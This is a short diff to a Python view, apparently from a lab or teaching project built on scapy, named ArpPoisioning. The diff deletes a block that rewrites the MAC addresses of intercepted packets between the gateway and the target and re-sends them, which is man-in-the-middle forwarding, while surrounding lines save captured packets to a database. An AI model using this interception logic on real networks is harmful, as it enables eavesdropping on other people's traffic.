@@ -203,22 +203,7 @@ def ArpPoisioning(request):
                         print("SAVING TO DATABASE")
                         new_packet.save()
                 
-                
-                # forward the packets the we are intercepting to the correct recipient
-                if(packet.getlayer(scapy.Ether).src == gateway_mac):
-                    # change destination MAC to adversary because we intercepted a packet going from the gateway to the adversary
-                    packet.getlayer(scapy.Ether).dst = adversary_mac
-                    scapy.send(packet)
-                elif(packet.getlayer(scapy.Ether).src == adversary_mac):
-                    # change destination MAC to gateway because we intercepted a packet going from the adversary to the gateway
-                    packet.getlayer(scapy.Ether).dst = gateway_mac
-                    scapy.send(packet)
 
-
-
-                
-                
-                    
     except KeyboardInterrupt:
         print("Closing")
 
